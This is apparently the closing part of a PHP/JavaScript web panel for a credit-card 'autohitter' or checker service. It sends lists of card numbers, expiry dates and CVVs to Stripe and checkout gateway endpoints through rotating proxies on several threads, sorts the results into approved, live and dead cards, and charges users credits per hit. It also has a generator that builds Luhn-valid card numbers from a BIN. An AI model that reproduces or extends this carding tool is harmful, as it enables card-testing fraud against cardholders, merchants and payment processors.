    $statTotal.textContent    = lines.length;
    $statYet.textContent      = lines.length;
    $statApproved.textContent = '0';
    $statLive.textContent     = '0';
    $statDead.textContent     = '0';
    $statGateway.textContent  = selectedApi.label;

    let creditsLeft  = parseInt($statCred.textContent, 10);
    const useProxy   = $proxySw.checked ? '1' : '0';

    // Proxy selection (random or specific)
    let proxyHost = '', proxyPort = '', proxyUser = '', proxyPass = '';
    if (useProxy === '1') {
      const selVal = $proxySelect.value;
      <?php
      // ALL_PROXIES embedded for JS
      echo 'const ALL_PROXIES = ' . json_encode(array_map(fn($p) => [
        'host'     => $p['host'],
        'port'     => $p['port'],
        'username' => $p['username'] ?? '',
        'password' => $p['password'] ?? ''
      ], $userProxies)) . ';';
      ?>
      if (selVal === 'random' && ALL_PROXIES.length) {
        const rnd = ALL_PROXIES[Math.floor(Math.random() * ALL_PROXIES.length)];
        proxyHost = rnd.host;
        proxyPort = rnd.port;
        proxyUser = rnd.username;
        proxyPass = rnd.password;
      } else if (selVal !== 'random') {
        try {
          const sel = JSON.parse(selVal);
          proxyHost = sel.host;
          proxyPort = sel.port;
          proxyUser = sel.username;
          proxyPass = sel.password;
        } catch {}
      }
    }

    async function runSingle(line) {
      try {
        const qs = new URLSearchParams({ cc: line, useProxy });

        // API-specific query params
        if (gateway === 'checkout' && api === 'paycheckout') {
          const urls = ($urlInput.value || '').split(/\n+/).map(s => s.trim()).filter(Boolean);
          const randUrl = urls[Math.floor(Math.random() * urls.length)] || urls[0];
          qs.append('url', randUrl);
        } else if (gateway === 'stripe' && (api === 'inbuilt_autohitter1' || api === 'inbuilt_autohitter2')) {
          qs.append('client_secret', $stripeClientSecret.value);
          qs.append('pk_key',        $stripePkKey.value);
          if ($stripeAcct.value) qs.append('acct', $stripeAcct.value);
        } else if (gateway === 'stripe' && api === 'stripe_checkout') {
          const cardNum = line.split('|')[0];
          // Only hit VISA / MC by default
          if (/^(3[47]|4|5[1-5]|2[2-7]|6)/.test(cardNum)) {
            qs.append('cs_live', $cs_live.value);
            qs.append('pk_live', $pk_live.value);
            qs.append('email',   $checkout_email.value);
            qs.append('amount',  $checkout_amount.value);
          }
        }

        // Proxy
        if (proxyHost && proxyPort) {
          qs.append('host', proxyHost);
          qs.append('port', proxyPort);
          qs.append('user', proxyUser);
          qs.append('pass', proxyPass);
        }

        const hitUrl = `${selectedApi.endpoint}?${qs.toString()}`;
        const t0 = performance.now();
        const res = await fetch(hitUrl, {
          method: 'GET',
          cache: 'no-store',
          signal: aborter.signal,
          keepalive: true
        });
        const t1 = performance.now();

        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        const respText = data.Response || data.response || data.status || 'Unknown';
        const gateName = data.Gateway || data.gateway || selectedApi.label;

        addSample(gateName, t1 - t0);

        const category = classify(data);
        const binInfo  = data.brand      || 'UNKNOWN';
        const cardType = data.card_type  || 'UNKNOWN';
        const cardLevel= data.level      || 'STANDARD';
        const issuerBank   = data.issuer || 'Unknown';
        const countryInfo  = data.country_info || 'Unknown';

        const resultBlock = `<div class="${category === 'APPROVED' ? 'line-ok' : category === 'LIVE' ? 'line-live' : 'line-dead'}">
#${esc(gateName).replace(/\s+/g, '')}
━━━━━━━━━━━
[ﾒ] Card ➜ <span class="cc-mask">${esc(line)}</span>
[ﾒ] Status ➜ ${category === 'APPROVED' ? 'Approved ✅' : category === 'LIVE' ? 'Live ✅' : 'Dead ❌'}
[ﾒ] Response ➜ ${esc(respText)}
[ﾒ] Gateway ➜ ${esc(gateName)}
━━━━━━━━━━━
[ﾒ] Info ➜ ${esc(binInfo)} - ${esc(cardType)} - ${esc(cardLevel)}
[ﾒ] Bank ➜ ${esc(issuerBank)}
[ﾒ] Country ➜ ${esc(countryInfo)}
━━━━━━━━━━━
[ﾒ] Time ➜ ${((t1 - t0)/1000).toFixed(2)}s
</div>`;

        if (category === 'APPROVED') {
          $boxApproved.innerHTML += resultBlock + '\n';
          $statApproved.textContent = String(parseInt($statApproved.textContent) + 1);
          byId('approvedSound')?.play();
          hitToast(respText, 'success');
          creditsLeft = Math.max(0, creditsLeft - selectedApi.credits);
        } else if (category === 'LIVE') {
          $boxLive.innerHTML += resultBlock + '\n';
          $statLive.textContent = String(parseInt($statLive.textContent) + 1);
          byId('liveSound')?.play();
          hitToast(respText);
          creditsLeft = Math.max(0, creditsLeft - 1);
        } else {
          $boxDead.innerHTML += resultBlock + '\n';
          $statDead.textContent = String(parseInt($statDead.textContent) + 1);
        }

        if (typeof data?.credits === 'number') creditsLeft = data.credits;
        $statCred.textContent = creditsLeft;
      } catch (e) {
        if (e.name === 'AbortError') throw e;
        const errMsg = e.message || 'Connection error';
        const errBlock = `<div class="line-dead">
#${esc(gatewayLabel(gateway, api))}
━━━━━━━━━━━
[ﾒ] Card ➜ <span class="cc-mask">${esc(line)}</span>
[ﾒ] Status ➜ Dead ❌
[ﾒ] Response ➜ ${esc(errMsg)}
[ﾒ] Gateway ➜ ${esc(gatewayLabel(gateway, api))}
━━━━━━━━━━━
[ﾒ] Info ➜ UNKNOWN
━━━━━━━━━━━
</div>`;
        $boxDead.innerHTML += errBlock + '\n';
        $statDead.textContent = String(parseInt($statDead.textContent) + 1);
      } finally {
        const linesArr = $txt.value.split('\n').map(l => l.trim()).filter(Boolean);
        const lineIdx = linesArr.indexOf(line);
        if (lineIdx > -1) {
          linesArr.splice(lineIdx, 1);
          $txt.value = linesArr.join('\n');
        }
        $statYet.textContent = String(Math.max(0, parseInt($statYet.textContent) - 1));
        tickProgress();
      }
    }

    const queue = [...lines];
    const maxThreads = <?= (int)$maxThreadsByPlan ?>;
    const workers = [];
    for (let i = 0; i < maxThreads; i++) {
      workers.push(worker(queue, { runOne: runSingle }));
    }
    await Promise.all(workers);

    if (running) {
      running = false;
      $start.disabled = false;
      $start.innerHTML = '<i class="fas fa-play mr-1"></i> Start Hitting';
      $stop.disabled = true;
      toast('Hitting completed!', 'success');
    }
  }

  if ($start) $start.addEventListener('click', startRun);
  if ($stop)  $stop.addEventListener('click', stopRun);

  // ------------------------------
  // SECTION 10.17: COPY / CLEAR RESULTS
  // ------------------------------
  if ($copyApproved) $copyApproved.addEventListener('click', () => {
    const text = $boxApproved.innerText.trim();
    if (text) navigator.clipboard.writeText(text).then(() => toast('Approved copied!', 'success'));
  });
  if ($copyLive) $copyLive.addEventListener('click', () => {
    const text = $boxLive.innerText.trim();
    if (text) navigator.clipboard.writeText(text).then(() => toast('Live copied!', 'success'));
  });
  if ($clearDead) $clearDead.addEventListener('click', () => {
    $boxDead.innerHTML = '';
    toast('Dead cleared', 'info');
  });

  // ------------------------------
  // SECTION 10.18: CC GENERATOR
  // ------------------------------
  function generateCard(binStr) {
    if (!binStr) return '';
    let processedBin = binStr.toLowerCase().replace(/x/g, () => Math.floor(Math.random() * 10));
    let doubled = processedBin.split('').map((d, i) =>
      (i % 2 === (processedBin.length % 2 === 0 ? 0 : 1) ? parseInt(d) * 2 : parseInt(d))
    );
    doubled = doubled.map(d => d > 9 ? d - 9 : d);
    const sum = doubled.reduce((a, b) => a + b, 0);
    const checkDigit = (10 - (sum % 10)) % 10;
    return processedBin + checkDigit;
  }

  function generateMonth(val) {
    if (val && val !== 'Random') return val.padStart(2, '0');
    return String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
  }

  function generateYear(val) {
    if (val && val !== 'Random') return val;
    const current = new Date().getFullYear();
    return current + Math.floor(Math.random() * 8);
  }

  function generateCvv() {
    let cvv = '';
    for (let i = 0; i < 3; i++) cvv += Math.floor(Math.random() * 10);
    return cvv;
  }

  function generate() {
    const bin = $genbin?.value.trim() || '';
    if (!bin) { toast('Enter BIN', 'warning'); return ''; }
    const qty = Math.min(Math.max(parseInt($genqty?.value) || 10, 1), 500);
    const cards = [];
    for (let i = 0; i < qty; i++) {
      const cc  = generateCard(bin);
      const mm  = generateMonth($month?.value);
      const yy  = generateYear($year?.value);
      const cvv = generateCvv();
      cards.push(`${cc}|${mm}|${yy}|${cvv}`);
    }
    return cards.join('\n');
  }

  if ($btnGen) $btnGen.addEventListener('click', () => {
    const cards = generate();
    if (cards) {
      const current = $txt.value.trim();
      $txt.value = current ? current + '\n' + cards : cards;
      toast(`${cards.split('\n').length} cards generated & added`, 'success');
    }
  });

  // ------------------------------
  // SECTION 10.19: CREDITS MODAL
  // ------------------------------
  function openCreditsModal() {
    if (!$creditsModal || !$creditsCard) return;
    $creditsModal.classList.remove('hidden');
    requestAnimationFrame(() => {
      $creditsCard.classList.remove('translate-y-4', 'opacity-0');
      $creditsCard.classList.add('translate-y-0', 'opacity-100');
    });
  }
  function closeCreditsModal() {
    if (!$creditsCard) return;
    $creditsCard.classList.add('translate-y-4', 'opacity-0');
    setTimeout(() => $creditsModal.classList.add('hidden'), 200);
  }
  if (!localStorage.getItem(ACK_KEY)) openCreditsModal();
  if ($ackBtn) $ackBtn.addEventListener('click', () => {
    localStorage.setItem(ACK_KEY, '1');
    closeCreditsModal();
  });

  // ------------------------------
  // SECTION 10.20: TOOLS MODAL
  // ------------------------------
  function openTools() {
    if (!$toolsModal || !$toolsSheet) return;
    $toolsModal.classList.remove('hidden');
    requestAnimationFrame(() => {
      $toolsSheet.classList.remove('translate-y-4', 'opacity-0');
      $toolsSheet.classList.add('translate-y-0', 'opacity-100');
    });
  }
  function closeTools() {
    if (!$toolsSheet) return;
    $toolsSheet.classList.add('translate-y-4', 'opacity-0');
    setTimeout(() => $toolsModal.classList.add('hidden'), 200);
  }
  if ($openToolsBtn) $openToolsBtn.addEventListener('click', openTools);
  if ($toolsClose)   $toolsClose.addEventListener('click', closeTools);
  if ($toolsModal)   $toolsModal.addEventListener('click', e => { if (e.target === $toolsModal) closeTools(); });

  // ------------------------------
  // SECTION 10.21: ON BEFORE UNLOAD
  // ------------------------------
  window.addEventListener('beforeunload', e => {
    if (running) e.returnValue = 'Hitting in progress!';
  });

  // ------------------------------
  // SECTION 10.22: INIT ON LOAD
  // ------------------------------
  applyCfg(loadCfg());          // restore config + set CFG_OK (fixed)
  if ($proxySw?.checked) $proxySelectContainer?.classList.remove('hidden');

  // auto-save extra inputs
  [$checkoutLinkInput, $cs_live, $pk_live, $checkout_email, $checkout_amount,
   $stripeClientSecret, $stripePkKey, $stripeAcct].forEach(el => {
    if (el) el.addEventListener('input', saveCurrentCfg);
  });

})();
</script>
</body>
</html>
